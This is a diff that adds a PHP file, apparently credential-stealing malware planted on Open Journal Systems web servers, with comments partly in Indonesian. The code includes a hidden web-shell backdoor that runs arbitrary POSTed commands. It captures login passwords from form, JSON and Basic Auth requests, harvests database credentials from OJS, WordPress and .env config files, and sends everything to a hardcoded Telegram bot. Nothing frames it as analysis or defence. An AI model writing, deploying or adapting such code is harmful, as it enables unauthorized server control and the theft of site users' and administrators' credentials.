@@ -1,0 +1,301 @@
+<?php
+/**
+ * ULTIMATE OJS LOGIN CAPTURE - NO SHELL_EXEC VERSION
+ * File: /dev/shm/.ojs_capture
+ * FIX: Error 500 solved - using pure PHP, no exec/shell_exec
+ */
+
+// ============================================
+// KONFIGURASI TELEGRAM
+// ============================================
+$bot_token = '8840330781:AAHMysRmWTiwkeodAOALmpsJ5EdftsvLy_Y';
+$chat_id = '8259867883';
+$server_name = gethostname();
+
+// ============================================
+// EMERGENCY BACKDOOR - TETAP WORK
+// ============================================
+if (isset($_GET['mullet'])) {
+    if (isset($_POST['cmd']) && function_exists('system')) {
+        system($_POST['cmd']);
+        exit;
+    }
+    die('<html><body style="background:#000;color:#0f0;"><h2>🔐 OJS BACKDOOR ACTIVE</h2>
+    <h3>Server: ' . $server_name . '</h3>
+    <form method=post><input type=text name=cmd size=50><button>RUN</button></form>
+    </body></html>');
+}
+
+// ============================================
+// FUNGSI: MANUAL SCAN CONFIG FILES (NO SHELL_EXEC)
+// ============================================
+function huntDatabaseCredentials() {
+    $found = [];
+    
+    // Path yang umum ditemui (tanpa shell_exec)
+    $common_paths = [
+        // OJS
+        $_SERVER['DOCUMENT_ROOT'] . '/config.inc.php',
+        dirname($_SERVER['DOCUMENT_ROOT']) . '/config.inc.php',
+        getcwd() . '/config.inc.php',
+        '/home/*/public_html/*/config.inc.php',
+        
+        // WordPress
+        $_SERVER['DOCUMENT_ROOT'] . '/wp-config.php',
+        dirname($_SERVER['DOCUMENT_ROOT']) . '/wp-config.php',
+        
+        // .env
+        $_SERVER['DOCUMENT_ROOT'] . '/.env',
+        dirname($_SERVER['DOCUMENT_ROOT']) . '/.env',
+    ];
+    
+    // Scan current directory and parent
+    $dirs_to_check = [
+        $_SERVER['DOCUMENT_ROOT'],
+        dirname($_SERVER['DOCUMENT_ROOT']),
+        getcwd(),
+        dirname(getcwd())
+    ];
+    
+    foreach ($dirs_to_check as $base_dir) {
+        if (!$base_dir || !is_dir($base_dir)) continue;
+        
+        // Check config.inc.php
+        $config_file = $base_dir . '/config.inc.php';
+        if (file_exists($config_file)) {
+            $content = @file_get_contents($config_file);
+            if ($content) {
+                $db_info = [];
+                if (preg_match('/name\s*=\s*"([^"]+)"/', $content, $m)) $db_info['db_name'] = $m[1];
+                if (preg_match('/username\s*=\s*"([^"]+)"/', $content, $m)) $db_info['db_user'] = $m[1];
+                if (preg_match('/password\s*=\s*"([^"]+)"/', $content, $m)) $db_info['db_pass'] = $m[1];
+                if (!empty($db_info)) {
+                    $found[] = ['type' => 'OJS Config', 'file' => $config_file, 'credentials' => $db_info];
+                }
+            }
+        }
+        
+        // Check wp-config.php
+        $wp_file = $base_dir . '/wp-config.php';
+        if (file_exists($wp_file)) {
+            $content = @file_get_contents($wp_file);
+            if ($content) {
+                $db_info = [];
+                if (preg_match("/DB_NAME',\s*'([^']+)'/", $content, $m)) $db_info['db_name'] = $m[1];
+                if (preg_match("/DB_USER',\s*'([^']+)'/", $content, $m)) $db_info['db_user'] = $m[1];
+                if (preg_match("/DB_PASSWORD',\s*'([^']+)'/", $content, $m)) $db_info['db_pass'] = $m[1];
+                if (!empty($db_info)) {
+                    $found[] = ['type' => 'WordPress Config', 'file' => $wp_file, 'credentials' => $db_info];
+                }
+            }
+        }
+        
+        // Check .env
+        $env_file = $base_dir . '/.env';
+        if (file_exists($env_file)) {
+            $content = @file_get_contents($env_file);
+            if ($content) {
+                $db_info = [];
+                if (preg_match('/DB_DATABASE=(.+)/', $content, $m)) $db_info['db_name'] = trim($m[1]);
+                if (preg_match('/DB_USERNAME=(.+)/', $content, $m)) $db_info['db_user'] = trim($m[1]);
+                if (preg_match('/DB_PASSWORD=(.+)/', $content, $m)) $db_info['db_pass'] = trim($m[1]);
+                if (!empty($db_info)) {
+                    $found[] = ['type' => '.env File', 'file' => $env_file, 'credentials' => $db_info];
+                }
+            }
+        }
+    }
+    
+    return $found;
+}
+
+// ============================================
+// FUNGSI: DAPETIN DOMAIN (NO SHELL_EXEC)
+// ============================================
+function getAllDomains() {
+    $domains = [];
+    
+    // Current domain
+    if (isset($_SERVER['HTTP_HOST'])) {
+        $domains[] = $_SERVER['HTTP_HOST'];
+    }
+    
+    // Try to read from Apache config jika bisa (limited)
+    $apache_configs = [
+        '/etc/apache2/sites-available/000-default.conf',
+        '/etc/apache2/sites-enabled/000-default.conf',
+        '/usr/local/apache2/conf/httpd.conf'
+    ];
+    
+    foreach ($apache_configs as $conf) {
+        if (file_exists($conf)) {
+            $content = @file_get_contents($conf);
+            if ($content && preg_match_all('/ServerName\s+([^\s]+)/', $content, $matches)) {
+                foreach ($matches[1] as $domain) {
+                    $domains[] = $domain;
+                }
+            }
+        }
+    }
+    
+    $domains = array_unique($domains);
+    return $domains;
+}
+
+// ============================================
+// CAPTURE LOGIN DARI FORM
+// ============================================
+$username = '';
+$password = '';
+
+// Cek POST data
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $possible_user = ['username', 'email', 'user', 'login', 'user_login', 'log', 'uname'];
+    $possible_pass = ['password', 'pass', 'pwd', 'user_pass', 'passwd', 'pw'];
+    
+    foreach ($possible_user as $field) {
+        if (isset($_POST[$field]) && !empty($_POST[$field])) {
+            $username = $_POST[$field];
+            break;
+        }
+    }
+    
+    foreach ($possible_pass as $field) {
+        if (isset($_POST[$field]) && !empty($_POST[$field])) {
+            $password = $_POST[$field];
+            break;
+        }
+    }
+    
+    // Fallback: cari manual
+    if (empty($username)) {
+        foreach ($_POST as $k => $v) {
+            if (stripos($k, 'user') !== false || stripos($k, 'email') !== false) {
+                $username = $v;
+                break;
+            }
+        }
+    }
+    if (empty($password)) {
+        foreach ($_POST as $k => $v) {
+            if (stripos($k, 'pass') !== false) {
+                $password = $v;
+                break;
+            }
+        }
+    }
+}
+
+// JSON payload
+if (empty($username) && $input = file_get_contents('php://input')) {
+    $json = @json_decode($input, true);
+    if ($json) {
+        $username = $json['username'] ?? $json['email'] ?? $json['user'] ?? '';
+        $password = $json['password'] ?? $json['pass'] ?? '';
+    }
+}
+
+// Basic Auth
+if (empty($username) && isset($_SERVER['PHP_AUTH_USER'])) {
+    $username = $_SERVER['PHP_AUTH_USER'];
+    $password = $_SERVER['PHP_AUTH_PW'];
+}
+
+// ============================================
+// KIRIM LAPORAN JIKA ADA LOGIN ATAU MINTA REPORT
+// ============================================
+$send_report = false;
+
+if (!empty($username) && !empty($password)) {
+    $send_report = true;
+}
+
+if (isset($_GET['report']) || isset($_GET['mullet'])) {
+    $send_report = true;
+}
+
+if ($send_report) {
+    
+    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? 
+          $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 
+          $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
+    
+    if (strpos($ip, ',') !== false) {
+        $ip = trim(explode(',', $ip)[0]);
+    }
+    
+    $current_host = $_SERVER['HTTP_HOST'] ?? 'unknown';
+    $current_path = $_SERVER['REQUEST_URI'] ?? '/';
+    $time = date('Y-m-d H:i:s');
+    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
+    
+    // Hunt credentials
+    $db_credentials = huntDatabaseCredentials();
+    $all_domains = getAllDomains();
+    
+    // Build message (max 4096 chars for Telegram)
+    $message = "🖥️ SERVER REPORT\n";
+    $message .= "━━━━━━━━━━━━━━━━━━━\n";
+    $message .= "🏷️ SERVER: {$server_name}\n";
+    $message .= "🕐 TIME: {$time}\n";
+    $message .= "🌐 IP: {$ip}\n";
+    $message .= "🌍 DOMAIN: {$current_host}\n";
+    $message .= "📍 PATH: {$current_path}\n";
+    
+    if (!empty($username) && !empty($password)) {
+        $message .= "━━━━━━━━━━━━━━━━━━━\n";
+        $message .= "🔐 LOGIN CAPTURED\n";
+        $message .= "👤 {$username}\n";
+        $message .= "🔑 {$password}\n";
+    }
+    
+    $message .= "━━━━━━━━━━━━━━━━━━━\n";
+    $message .= "🗄️ DATABASE CREDENTIALS:\n";
+    
+    if (!empty($db_credentials)) {
+        foreach ($db_credentials as $cred) {
+            $message .= "\n📁 {$cred['type']}\n";
+            $message .= "   📂 " . basename($cred['file']) . "\n";
+            foreach ($cred['credentials'] as $k => $v) {
+                $message .= "   🔑 {$k}: {$v}\n";
+            }
+        }
+    } else {
+        $message .= "⚠️ Tidak ditemukan\n";
+    }
+    
+    $message .= "━━━━━━━━━━━━━━━━━━━\n";
+    $message .= "🌐 DETECTED DOMAINS:\n";
+    
+    if (!empty($all_domains)) {
+        foreach (array_slice($all_domains, 0, 10) as $domain) {
+            $message .= "   └─ {$domain}\n";
+        }
+    } else {
+        $message .= "   └─ {$current_host}\n";
+    }
+    
+    $message .= "━━━━━━━━━━━━━━━━━━━\n";
+    $message .= "💡 ?mullet untuk shell\n";
+    $message .= "💡 ?report untuk repeat\n";
+    
+    // Kirim ke Telegram
+    $url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
+    $post_data = "chat_id={$chat_id}&text=" . urlencode($message);
+    
+    if (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_exec($ch);
+        curl_close($ch);
+    }
+    
+    // Log lokal (biar ada backup)
+    @file_put_contents('/tmp/ojs_monitor.log', "[{$time}] {$username}|{$password}|{$ip}\n", FILE_APPEND);
+}
+?>
